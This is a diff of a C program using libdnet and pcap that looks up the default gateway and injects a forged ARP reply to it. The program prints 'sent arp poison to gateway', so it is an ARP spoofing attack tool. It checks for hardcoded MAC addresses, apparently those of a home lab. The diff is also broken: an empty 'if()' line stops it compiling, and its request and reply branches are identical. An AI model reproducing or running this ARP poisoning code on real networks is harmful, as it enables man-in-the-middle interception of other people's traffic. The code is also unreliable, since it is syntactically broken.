@@ -1,10 +1,11 @@
 #include <stdio.h>
+#include <unistd.h>
 #include <dnet.h>
 #include <string.h>
 #include <stdlib.h>
 #include "pcap.h"
 
-static void getDefaultGatewayIp(uint32_t* ip){
+static void getDefaultGatewayIp(struct addr* ip){
     route_t* router = route_open();
 
     struct route_entry entry;
@@ -12,28 +13,39 @@ static void getDefaultGatewayIp(uint32_t* ip){
     addr_pton("8.8.8.8", &entry.route_dst);
 
     route_get(router, &entry);
-
-    *ip = entry.route_gw.addr_ip;
+    
+    memmove(ip, &entry.route_gw, sizeof(struct addr));
+    printf("gw ip is %s\n", addr_ntoa(&entry.route_gw));
     route_close(router);
  
 }
-
+static int findHwAddrLoop(const struct arp_entry* entry, void* arg){
+    struct arp_entry* target = (struct arp_entry*)arg;
+    if ( target->arp_pa.addr_ip
+            == entry->arp_pa.addr_ip){
+        memmove(&target->arp_ha, &entry->arp_ha,
+                            sizeof(struct addr));
+    }
+    return 0;
+}
 static void getDefaultGatewayHw(uint8_t* buf){
-    uint32_t ip;
-    getDefaultGatewayIp(&ip);
     struct arp_entry entry;
-    addr_pton(addr_ntoa(ip), &entry.arp_pa);
+    getDefaultGatewayIp(&entry.arp_pa);
 
+    printf("gw ip is %s\n", addr_ntoa(&entry.arp_pa));
     arp_t* arper = arp_open();
     int ec = arp_get(arper, &entry);
     if (ec != 0){
-        printf("Could not find hardware address of default gateway\n");
-        exit(2);
+        arp_loop(arper, findHwAddrLoop, &entry);
+        if (entry.arp_ha.addr_type == 0){
+            printf("Could not find hardware address of default gateway\n");
+            exit(2);
+        }
     }
     memmove(buf, &entry.arp_ha.addr_eth, 6);
 }
 
-static void getHostMacAddr(uint8_t* buf){
+static void getHostHw(uint8_t* buf){
     eth_t* eth = eth_open("eth0");
     eth_addr_t ethAddr;
 
@@ -66,10 +78,17 @@ static uint8_t* getArpPacket(
     void* packet = malloc(sizeof(arp_h) + sizeof(ether_h));
     ether_h* eth = (ether_h*)(packet);
 
-    fillEthPacket(eth, bc, srcHw, ETH_PROTO_ARP);
-
+    if (operation == ARP_REQUEST){
+        fillEthPacket(eth, bc, srcHw, ETH_PROTO_ARP);
+    }else if (operation == ARP_REPLY){
+        fillEthPacket(eth, bc, srcHw, ETH_PROTO_ARP);
+    }else{
+        printf("Invalid arp operation\n");
+        exit(2);
+    }
 
     arp_h* arp = (arp_h*)(packet + sizeof(ether_h));//ETHER_H_SIZE);
+
     // 1 for ethernet
     arp->hw_type = htons(0x1);
 
@@ -110,29 +129,60 @@ uint8_t hwEth[] = {0x10, 0xc3, 0x7b, 0x4d, 0xc2, 0xbc};
 // 10:c3:7b:4d:c2:bc
 uint8_t hwRouter[] = {0xe0, 0x3f, 0x49, 0x9c, 0x67, 0x58};
 uint8_t hwLaptop[] = {0x60, 0x67, 0x20, 0x2b, 0x34, 0x94};
+uint8_t hwBc[] = {0xff,0xff,0xff,0xff,0xff,0xff};
 
 int main(int argc, char* argv[]){
+    if (getuid() != 0){
+        printf("Must be root.\n");    
+        return 1;
+    }
+    if (argc < 2){
+        printf("usage: ./%s <target ip>\n", argv[0]);
+        return 1;
+    }
     uint8_t hostHw[6];
     uint8_t routerHw[6];
-    uint32_t gwIp;
+    struct addr gwIp;
     getHostHw(hostHw);
     getDefaultGatewayHw(routerHw);
     getDefaultGatewayIp(&gwIp);
+    for(int i=0; i<6; i++){
+        if (routerHw[i] != hwRouter[i]){
+            printf("gateway hw addr doesn't match\n");
+            return 2;
+        }    
+        if (hostHw[i] != hwEth[i]){
+            printf("host hw addr doesn't match\n");
+            return 2;
+        }    
+    }
+    if()
+    pcap_t* cap = setPromiscuous("eth0","arp");
+
     uint8_t* arp = getArpPacket(ARP_REPLY,
+                                hostHw,
+                                IP(argv[1]),
+                                routerHw,
+                                gwIp.addr_ip
+                                );
+
+
+    pcap_inject(cap, arp, ETHER_H_SIZE + ARP_H_SIZE);
+
+    printf("sent arp poison to gateway\n");
+    return 0;
+    arp = getArpPacket(ARP_REPLY,
                                 hostHw,
                                 IP("192.168.1.3"),
                                 routerHw,
-                                gwIp
+                                gwIp.addr_ip
                                 );
 
-    printf("got packet\n");
-    pcap_t* cap = setPromiscuous("eth0","arp");
 
-    printf("got interface\n");
     pcap_inject(cap, arp, ETHER_H_SIZE + ARP_H_SIZE);
 
-    printf("sent arp\n");
-    
+   
+    printf("sent arp to target %s\n","ip");
     return 0;    
 }
 
